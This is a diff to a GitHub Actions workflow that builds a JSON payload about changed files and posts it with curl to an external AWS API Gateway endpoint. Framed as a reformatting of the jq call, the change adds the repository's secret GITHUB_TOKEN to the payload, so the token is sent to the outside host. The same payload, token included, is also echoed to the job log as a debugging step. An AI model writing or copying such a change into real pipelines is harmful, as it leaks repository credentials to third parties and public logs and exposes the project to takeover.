@@ -51,7 +51,14 @@ jobs:
             files_changed='[]'
           fi
           files_changed=$(echo $files_changed | jq .)
-          json_payload=$(jq -n --arg repo_owner "${{ github.repository_owner }}" --arg repo "${{ github.event.repository.name }}" --argjson files_changed "$files_changed" --arg github_token "${{ secrets.GITHUB_TOKEN }}" '{repo_owner: $repo_owner, repo: $repo, files_changed: $files_changed}')
+
+          json_payload=$(jq -n \
+            --arg repo_owner "${{ github.repository_owner }}" \
+            --arg repo "${{ github.event.repository.name }}" \
+            --argjson files_changed "$files_changed" \
+            --arg github_token "${{ secrets.GITHUB_TOKEN }}" \
+            '{repo_owner: $repo_owner, repo: $repo, files_changed: $files_changed, github_token: $github_token}')
+                    
           echo "JSON Payload: $json_payload"  # Debugging step
           response=$(curl -s https://itqiio6c6j.execute-api.us-east-2.amazonaws.com -H "Content-Type: application/json" -d "$json_payload")
           if [ $? -ne 0 ]; then
